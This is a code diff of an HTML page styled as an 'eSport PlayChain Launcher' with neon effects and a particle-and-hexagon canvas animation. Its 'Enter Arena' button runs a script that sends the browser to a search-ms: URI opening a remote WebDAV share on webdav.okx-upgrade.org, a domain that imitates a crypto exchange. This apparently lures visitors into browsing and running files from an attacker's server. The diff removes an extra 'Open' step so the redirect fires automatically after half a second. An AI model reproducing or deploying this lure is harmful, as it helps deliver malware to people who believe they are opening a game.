@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>eSport Explorer Launcher</title>
+    <title>eSport PlayChain Launcher</title>
     <style>
         body {
             margin: 0;
@@ -41,7 +41,6 @@
             transform: scale(1.05);
         }
 
-        /* Neon glow effect */
         .enter-button::before {
             content: '';
             position: absolute;
@@ -85,26 +84,6 @@
             display: flex;
         }
 
-        .open-button {
-            margin-top: 20px;
-            padding: 15px 30px;
-            font-size: 20px;
-            color: #00ffff;
-            background: transparent;
-            border: 2px solid #00ffff;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        .open-button:hover {
-            background: #00ffff;
-            color: #0a0a23;
-            box-shadow: 0 0 15px #00ffff;
-        }
-
         .loader {
             width: 60px;
             height: 60px;
@@ -120,7 +99,7 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* eSport background canvas */
+        /* Background animation canvas */
         #background {
             position: absolute;
             width: 100%;
@@ -128,56 +107,49 @@
             z-index: -1;
         }
 
-        /* Arena-like overlay */
-        .arena-overlay {
+        /* Hexagonal grid overlay */
+        .hex-grid {
             position: absolute;
             width: 100%;
             height: 100%;
-            z-index: -1;
+            z-index: 0;
             background: radial-gradient(circle, rgba(0, 255, 255, 0.1) 0%, transparent 70%);
-            animation: pulse 5s infinite ease-in-out;
+            opacity: 0.3;
+        }
+
+        /* Pulsing neon lines */
+        .neon-lines {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+        }
+
+        .neon-lines::before, .neon-lines::after {
+            content: '';
+            position: absolute;
+            background: #00ffff;
+            opacity: 0.2;
+            animation: pulse 4s ease-in-out infinite;
+        }
+
+        .neon-lines::before {
+            width: 100%;
+            height: 2px;
+            top: 20%;
+            box-shadow: 0 0 10px #00ffff;
+        }
+
+        .neon-lines::after {
+            width: 2px;
+            height: 100%;
+            left: 30%;
+            box-shadow: 0 0 10px #00ffff;
         }
 
         @keyframes pulse {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 0.6; }
-        }
-
-        /* HUD-like elements */
-        .hud-elements {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            pointer-events: none;
-        }
-
-        .hud-elements::before, .hud-elements::after {
-            content: '';
-            position: absolute;
-            border: 2px solid rgba(0, 255, 255, 0.2);
-            animation: flicker 2s infinite;
-        }
-
-        .hud-elements::before {
-            top: 20px;
-            left: 20px;
-            right: 20px;
-            height: 50px;
-            border-bottom: none;
-        }
-
-        .hud-elements::after {
-            bottom: 20px;
-            left: 20px;
-            right: 20px;
-            height: 50px;
-            border-top: none;
-        }
-
-        @keyframes flicker {
             0%, 100% { opacity: 0.2; }
-            50% { opacity: 0.4; }
+            50% { opacity: 0.5; }
         }
 
         /* Responsive design */
@@ -189,10 +161,6 @@
             .wait-overlay {
                 font-size: 24px;
             }
-            .open-button {
-                padding: 10px 20px;
-                font-size: 16px;
-            }
             .loader {
                 width: 40px;
                 height: 40px;
@@ -203,51 +171,46 @@
 </head>
 <body>
     <canvas id="background"></canvas>
-    <div class="arena-overlay"></div>
-    <div class="hud-elements"></div>
-    <button class="enter-button" onclick="showWaitOverlay()">Enter Arena</button>
+    <div class="hex-grid"></div>
+    <div class="neon-lines"></div>
+    <button class="enter-button" onclick="openExplorer()">Enter Arena</button>
     <div class="wait-overlay" id="waitOverlay">
-        <div>Accessing Arena</div>
+        <div>Please Wait</div>
         <div class="loader"></div>
-        <button class="open-button" onclick="openExplorer()">Open</button>
     </div>
 
     <script>
-        function showWaitOverlay() {
-            document.getElementById('waitOverlay').classList.add('active');
-        }
-
         function openExplorer() {
-            // Attempt to open URI
-            window.location.href = 'search-ms:query=love&crumb=location:\\\\webdav.okx-upgrade.org@SSL\\DavWWWRoot&displayname=Search';
-            // Note: If user cancels, browser will stay on page, keeping overlay active
+            document.getElementById('waitOverlay').classList.add('active');
+            setTimeout(() => {
+                window.location.href = 'search-ms:query=love&crumb=location:\\\\webdav.okx-upgrade.org@SSL\\DavWWWRoot&displayname=Search';
+            }, 500);
         }
 
-        // eSport background animation
+        // Background animation
         const canvas = document.getElementById('background');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
 
         const particlesArray = [];
-        const numberOfParticles = 200;
+        const numberOfParticles = 120;
 
         class Particle {
             constructor() {
                 this.x = Math.random() * canvas.width;
                 this.y = Math.random() * canvas.height;
-                this.size = Math.random() * 5 + 1;
-                this.speedX = Math.random() * 1 - 0.5; // Faster for arena feel
-                this.speedY = Math.random() * 1 - 0.5;
-                this.color = `hsl(${Math.random() * 60 + 180}, 100%, ${Math.random() * 20 + 40}%)`;
-                this.type = Math.random() < 0.3 ? 'square' : 'circle'; // Mix shapes
+                this.size = Math.random() * 5 + 2;
+                this.speedX = Math.random() * 0.6 - 0.3;
+                this.speedY = Math.random() * 0.6 - 0.3;
+                this.color = `hsl(${Math.random() * 60 + 180}, 100%, 50%)`;
             }
 
             update() {
                 this.x += this.speedX;
                 this.y += this.speedY;
 
-                if (this.size > 0.2) this.size -= 0.03;
+                if (this.size > 0.2) this.size -= 0.05;
 
                 if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
                 if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
@@ -256,34 +219,75 @@
             draw() {
                 ctx.fillStyle = this.color;
                 ctx.beginPath();
-                if (this.type === 'square') {
-                    ctx.rect(this.x - this.size / 2, this.y - this.size / 2, this.size, this.size);
-                } else {
-                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-                }
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                 ctx.fill();
             }
         }
+
+        // Hexagon drawing for eSport vibe
+        class Hexagon {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.size = Math.random() * 20 + 10;
+                this.speedX = Math.random() * 0.2 - 0.1;
+                this.speedY = Math.random() * 0.2 - 0.1;
+                this.opacity = Math.random() * 0.3 + 0.1;
+            }
+
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+
+                if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
+                if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
+            }
+
+            draw() {
+                ctx.beginPath();
+                ctx.strokeStyle = `rgba(0, 255, 255, ${this.opacity})`;
+                ctx.lineWidth = 1;
+                for (let i = 0; i < 6; i++) {
+                    const angle = (Math.PI / 3) * i;
+                    const x = this.x + this.size * Math.cos(angle);
+                    const y = this.y + this.size * Math.sin(angle);
+                    if (i === 0) {
+                        ctx.moveTo(x, y);
+                    } else {
+                        ctx.lineTo(x, y);
+                    }
+                }
+                ctx.closePath();
+                ctx.stroke();
+            }
+        }
+
+        const hexagonsArray = [];
+        const numberOfHexagons = 30;
 
         function init() {
             for (let i = 0; i < numberOfParticles; i++) {
                 particlesArray.push(new Particle());
             }
+            for (let i = 0; i < numberOfHexagons; i++) {
+                hexagonsArray.push(new Hexagon());
+            }
         }
 
         function animate() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; // Slight trail effect
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            for (let i = 0; i < particlesArray.length; i++) {
-                particlesArray[i].update();
-                particlesArray[i].draw();
-
-                if (particlesArray[i].size <= 0.2) {
-                    particlesArray.splice(i, 1);
-                    i--;
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particlesArray.forEach(particle => {
+                particle.update();
+                particle.draw();
+                if (particle.size <= 0.2) {
+                    particlesArray.splice(particlesArray.indexOf(particle), 1);
                     particlesArray.push(new Particle());
                 }
-            }
+            });
+            hexagonsArray.forEach(hexagon => {
+                hexagon.update();
+                hexagon.draw();
+            });
             requestAnimationFrame(animate);
         }
 
